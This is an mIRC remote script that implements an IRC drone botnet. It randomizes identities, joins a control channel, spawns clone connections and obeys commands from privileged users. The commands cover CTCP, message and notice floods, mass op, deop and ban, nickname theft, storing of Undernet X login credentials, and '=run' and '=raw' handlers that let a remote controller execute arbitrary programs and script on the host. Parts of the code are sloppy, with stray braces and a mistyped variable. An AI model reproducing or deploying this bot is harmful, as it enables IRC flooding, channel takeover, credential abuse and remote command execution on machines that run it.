[script]
n0=on *:start:{
n1=  
n2=  .st
n3=}
n4=alias st {
n5=  nick $read nicks.txt
n6=  anick $read nicks.txt
n7=  fullname $read nicks.txt
n8=  identd on $read id3nt.txt
n9=  set %cons
n10=  notify on | notify nick
n11=  writeini mirc.ini mirc user $r(a,z) $+ $r(a,z)  $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(11111,99999) | saveini
n12=  ignore -td *!*@* 
n13=  server servere -j #dronelepisdii
n14=  server -m serveree | set %clona1 2
n15=  .timer 1 1 .scid %clona1 server -m serveree  | set %clona2 $calc(%clona1 + 1)
n16=  .timer 1 2 .scid %clona2 server -m serveree  | set %clona3 $calc(%clona2 + 1)
n17=  .timer 
n18=  set %utimee $ctime 
n19=  set %1 ..0,15...1,16....5,10...6,9...7,8...8,7...9,6...10,5...11,4...12,3...13,2...14,1...0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6...10,5...11,4.....0,15...1,16...2,13...3,12.]
n20=  set %2 1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>
n21=  set %3 6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4,6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4  
n22=}
n23=on 1:connect:{
n24=  nick $read nicks.txt
n25=  anick $read nicks.txt
n26=  fullname $read id3nt.txt
n27=  identd on $read id3nt.txt
n28=  away 4Dai La Deal Dai La Deal JIP JIP JIP =)
n29=  timer 1 5 mode $me +wx
n30=  notify on
n31=}
n32=
n33=on 1:unotify: {
n34=  .nick $nick 
n35=}
n36=on *:nick: {
n37=  .timer 1 1 .sclavi $newnick [ % $+ [ $newnick ] ] 
n38=  .timer 1 0 .mode $newnick +wx
n39=}
n40=alias checkme {
n41=  if ($1 !== $2) { echo checkme }
n42=  if ($1 == $2) { join #inapt sex } 
n43=}
n44=alias sclavi {
n45=  if ($1 == $2) { 
n46=    .timer 1 4 notify off 
n47=    .msg [ % $+ [ $1 $+ usr ] ] 
n48=    .timer 1 1 .checkme $me $1 | halt 
n49=    .timer 1 0 mode $1 +wx  | halt
n50=  }
n51=  if ($1 !== $2) { echo sclavi }
n52=}
n53=alias connectcheck { whois $me }
n54=}
n55=on 1:kick:#:{
n56=haltdef
n57=if ($knick == $me) {
n58=  .raw join $mass
n59=  halt
n60=}
n61=
n62=on 100:text:*:*:{
n63=  if ($1 == =flc) { .timer 1 0 ctcp $2 ..0,15...1,16....5,10...6,9...7,8...8,7...9,6...10,5...11,4...12,3...13,2...14,1...0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6...10,5...11,4.....0,15...1,16...2,13...3,12.] }
n64=  if ($1 == =flm) { .timer 1 0 msg $2  1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*> }
n65=  if ($1 == =fln) { .timer 1 0 notice $2 6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4,6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4   }
n66=
n67=  if ($1 == ,flc) { .timer 2 0 scid %clona1 .ctcp $2 %1 | .timer 2 0 scid %clona2 .ctcp $2 %1 | .timer 2 0 scid %clona3 .ctcp $2 %1 | .timer 1 3  scid %clona1 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 3  scid %clona2 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 3  scid %clona3 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt  }
n68=  if ($1 == ,flm) { .timer 2 0 scid %clona1 .msg $2 %2 | .timer 1 0 scid %clona2 .msg $2 %2 | .timer 1 0 scid %clona3 .msg $2 %2 | .timer 1 0  scid %clona1 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona2 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona3 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt   }
n69=  if ($1 == ,fln) { .timer 2 0 scid %clona1 .notice $2 %3 | .timer 1 0 scid %clona2 .notice $2 %3 | .timer 1 0 scid %clona3 .notice $2 %3 | .timer 1 0  scid %clona1 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona2 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona3 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt  }
n70=
n71=  if ($1 == =op) { if ($2 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $2- } | halt }
n72=  if ($1 == =dop) { if ($2 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $2- } | halt }
n73=  if ($1 == =v) { if ($2 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $2- } | halt }
n74=  if ($1 == =dv) { if ($2 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $2- } | halt }
n75=  if ($1 == =ontime) { notice $nick Ontime: $uptime(server,1) | halt }
n76=  if ($1 == =rand) nick $read nicks.txt
n77=  if ($1 == =r) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt }
n78=  if ($1 == =ban) { mode $chan -o+b $2 $address($2,2) | kick $chan $2- ( $+ $nick $+ ) | halt }
n79=  if ($1 == =set1) { part %chan | set %chan $2 | timer 1 3 join %chan | halt }
n80=  if ($1 == =set2) { part %chan2 | set %chan2 $2 | timer 1 3 join %chan2 | halt }
n81=  if ($1 == =un2) { part %chan2 | unset %chan2 | halt } 
n82=  if ($1 == =run) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
n83=  if ($1 == =cln) { server -m $2- -i $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+   $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+   $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+   $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+   | .notice $nick 15CC14CC1CLONING14G15G | halt }
n84=  if ($1 == =exit) && ($level($address($nick,2)) > 2) { exit | halt }
n85=  if ($1 == =msg) { timer 1 0 scid %dd msg $2- | halt }
n86=  if ($1 == =j) { join $2- | who $2 | halt }
n87=  if ($1 == =c) { if (%console == 1) set %console 0 | else set %console 1 }
n88=  if ($1 == =rehash) { .reload win.ini | .timer 10 0 raw ping me | .timer 3 0 ctcp x ping | .timer 1 1 .msg $chan rehash a fost facut }
n89=  if ($1 == =lo) { .msg x@channels.undernet.org login $2- }
n90=  if ($1 == version) { .msg $chan $ver | halt }
n91=  if ($1 == =p) {
n92=    if ($2 = $chr(42)) {
n93=      set %paid 0
n94=      set %tp $chan(0)
n95=      while (%tp > %paed) {
n96=        set %paid $calc(%paid + 1)
n97=        if ($chan(%paid) != %chan) && ($chan(%paid) != %chan2) { .part $chan(%paed) La cererea lu` $nick (Am plecat) }
n98=      }
n99=    }
n100=    .timer 1 0 part $2- 
n101=    halt
n102=  }
n103=  if ($1 == =fura) { .notify $2 | .notice $nick 2,15 Sustragem  nicku (4,15 $2 2,15) ...  | halt }
n104=  if ($1 == =fura+log) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | .notify $2 | .notice $nick 2,15 Sustragem  nicku (4,15 $2 2,15) ...  | halt }
n105=  if ($1 == =lasa+log) { .notify -r $2 | unset % $+ $2 | unset % $+ [ $2 $+ usr ] | .notice $nick 2,15 oricum m-am saturat de el , nick'u (4,15 $2 2,15) e scos ...  | halt }
n106=  if ($1 == =lasa) { .notify -r $2 | .notice $nick 2,15 oricum m-am saturat de el , nick'u (4,15 $2 2,15) e scos ...  | halt }
n107=  if ($1 == =me) { describe $chan $2- | halt }
n108=  if ($1 == =ame) { ame $2- | halt }
n109=  if ($1 == ,rnick) { .timer 1 0  scid %clona1 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona2 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | .timer 1 0  scid %clona3 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt }
n110=  if ($1 == ,exit) && ($level($address($nick,2)) > 2) { .scid %clona1 exit | .scid %clona2 exit | .scid %clona3 exit | halt }
n111=  if ($1 == ,join) { .timer 1 0 scid %clona1 join $2- | .timer 1 0 scid %clona2 join $2- | .timer 1 0 scid %clona3 join $2- |  who $2 | halt }
n112=  if ($1 == ,part) { .timer 1 0 scid %clona1 part $2- | .timer 1 0 scid %clona2 part $2- | .timer 1 0 scid %clona3 part $2- |  who $2 | halt }
n113=  if ($1 == ,msg)  { .timer 1 0 scid %clona1 msg $2- | .timer 1 0 scid %clona2 msg $2- | .timer 1 0 scid %clona3 msg $2- | halt }
n114=  if ($1 == ,ctcp) { .timer 1 0 scid %clona1 .ctcp $2- | .timer 1 0 scid %clona2 .ctcp $2- | .timer 1 0 scid %clona3 .ctcp $2-  | halt }
n115=  if ($1 == ,fura) { .scid %clona1 notify $2 | .scid %clona2 notify $2 | .scid %clona3 notify $2 | .notice $nick 9,1 Am bagat nick'u (14,1 $2 9,1) �n Lista... [4,1pe UNDERNET9,1]  | halt }
n116=  if ($1 == ,fura+log) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | .scid %clona1 notify $2 | .scid %clona2 notify $2 | .scid %clona3 notify $2 | .notice $nick 9,1 Am bagat nick'u (14,1 $2 9,1) �n Lista... [4,1pe UNDERNET9,1]  | halt  }
n117=  if ($1 == ,lasa) { .scid %clona1 notify -r $2 | .scid %clona2 notify -r $2 | .scid %clona3 notify -r $2 | .notice $nick 9,1 Am scos nick'u (14,1 $2 9,1) �n Lista... [4,1pe UNDERNET9,1]  | halt }
n118=  if ($1 == ,lasa+log) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | .scid %clona1 notify -r $2 | .scid %clona2 notify -r $2 | .scid %clona3 notify -r $2 | .notice $nick 9,1 Am scos nick'u (14,1 $2 9,1) �n Lista... [4,1pe UNDERNET9,1]  | halt }
n119=  if ($1 == $me) {
n120=    if ($2 == o) { if ($3 == $chr(42)) { if ($4 == $null) { allop $chan | halt } | else { allop $4 | halt } | halt } |  if ($3 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $3- } | halt }
n121=    if ($2 == dop) { if ($3 == $chr(42)) { if ($4 == $null) { alldeop $chan | halt } | else { alldeop $4 | halt } | halt } | if ($3 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $3- } | halt }
n122=    if ($2 == v) { if ($3 == $chr(42)) { if ($4 == $null) { allvoice $chan | halt } | else { allvoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $3- } | halt }
n123=    if ($2 == dv) { if ($3 == $chr(42)) { if ($4 == $null) { alldevoice $chan | halt } | else { alldevoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $3- } | halt }
n124=    if ($2 == r) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z)  | halt }
n125=    if ($2 == n) { .timer 1 0 nick $3 | halt }
n126=    if ($2 == msg) { .timer 1 0 msg $3- | halt }
n127=    if ($2 == say) { .timer 1 0 msg $chan $3- | halt }
n128=    if ($2 == quit) { .timer 1 0 quit $3- | halt }
n129=    if ($2 == notice) { .timer 1 0 notice $3- | halt }
n130=    if ($2 == ctcp) { .ctcp $3- | halt }
n131=    if ($2 == run) { run $2- | .notice $nick 2,15 Am executat (4,15 $2- 2,15)  | halt } 
n132=    if ($2 == ri) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z)  | halt }
n133=    if ($2 == rand) nick $read nicks.txt
n134=    if ($2 == version) { .msg $chan $ver | halt }
n135=    if ($2 == fura) { notify $3 | .notice $nick 1,15 2,15 Am adaugat nick'u (4,15 $3 2,15) �n lista...  | halt }
n136=    if ($2 == lasa) { notify -r $3 | .notice $nick 1,15 2,15 Am scos nick'u (4,15 $3 2,15) din lista...  | halt }
n137=    if ($2 == clone) { server -m | .notice $nick 15CC14CC1CLONING14GG15 | halt }
n138=    if ($2 == exit) && ($level($address($nick,2)) > 2) { exit | halt }
n139=    if ($2 == reconn) { server | halt }
n140=    if ($2 == part) {
n141=      if ($3 == $chr(42)) {
n142=        set %paid 0
n143=        set %tp $chan(0)
n144=        while (%tp > %paid) {
n145=          set %paid $calc(%paid + 1)
n146=          if ($chan(%paid) != %chan) { .part $chan(%paid) La cererea lu` $nick (Am plecat) }
n147=        }
n148=      }
n149=      .timer 1 0 part $3- 
n150=      halt
n151=    }
n152=    .timer 1 0 $2-
n153=  }
n154=  if ($1 == =quit) { .timer 1 0 quit $2- | halt }
n155=  if ($1 == =say) { .timer 1 0 msg $chan $2- | halt }
n156=  if ($1 == =msg) { .timer 1 0 msg $2- | halt }
n157=  if ($1 == =notice) { .timer 1 0 notice $2- | halt }
n158=  if ($1 == =cycle) { .timer 1 0 part $2 $3- | .timer 1 1 join $2 | halt }
n159=  if ($1 == =ctcp) { .timer 1 0 .ctcp $2- | halt }
n160=  if ($1 == =version) { .notice $chan $ver | halt }
n161=  if ($1 == =exit) {
n162=    .partall
n163=    .timerexit 1 3 exit
n164=  }
n165=  if ($1 == =raw) {
n166=    $$2-
n167=  }
n168=}
n169=
n170=raw 471:*:{
n171=  haltdef
n172=  .timerjoin $+ $$2 0 60 join $$2
n173=  halt
n174=}
n175=
n176=raw 473:*:{
n177=  haltdef
n178=  .timerjoin $+ $$2 0 60 join $$2
n179=  halt
n180=}
n181=
n182=raw 474:*:{
n183=  haltdef
n184=  .timerjoin $+ $$2 0 60 join $$2
n185=  halt
n186=}
n187=
n188=raw 475:*:{
n189=  haltdef
n190=  .timerjoin $+ $$2 0 60 join $$2
n191=  halt
n192=}
n193=
n194=alias ver return ::: Merge pe :::( 1Richard Drone Setup: $os )::( 1De:: $uptime(server,1) ):::
